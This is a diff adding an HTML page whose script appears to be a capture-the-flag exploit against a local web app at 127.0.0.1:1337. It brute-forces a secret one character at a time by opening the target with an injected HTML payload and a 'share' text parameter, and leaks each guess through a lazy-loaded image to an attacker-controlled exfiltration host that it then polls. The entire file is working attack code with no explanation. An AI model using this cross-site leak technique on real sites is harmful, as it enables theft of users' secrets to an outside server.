@@ -1,0 +1,55 @@
+<script>
+    (async () => {
+        const target = "http://127.0.0.1:1337/";
+
+        var { exfil, sttf } = await fetch("/info").then((r) => r.json());
+
+        const charset = "1234567890abcdef}";
+
+        const MAX_LEN = 26;
+        const TAB = 1;
+
+        const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+
+        while (sttf.length < MAX_LEN) {
+            let progressed = false;
+
+            for (let i = 0; i < charset.length; i += TAB) {
+                var cands = sttf + charset[i];
+
+                const htmls = `<svg xmlns="http://www.w3.org/2000/svg" width="500" height="3000"></svg><br/>A<img loading=lazy src=//${exfil}/leak?q=${[
+                    ...cands,
+                ]
+                    .reverse()
+                    .join("")}>`;
+
+                window.open(
+                    `${target}?word=${encodeURIComponent(htmls)}` +
+                        `&cut=9999` +
+                        `&share=${cands}`,
+                    "_blank",
+                    "noopener",
+                );
+
+                await sleep(3500);
+
+                let resp = "";
+                try {
+                    const res = await fetch(`//${exfil}/check`, {
+                        cache: "no-store",
+                    });
+                    resp = (await res.text()).trim();
+                } catch {}
+
+                if (resp && cands === resp) {
+                    sttf = cands === resp ? cands : sttf;
+
+                    progressed = true;
+                    break;
+                }
+            }
+
+            if (!progressed) break;
+        }
+    })();
+</script>
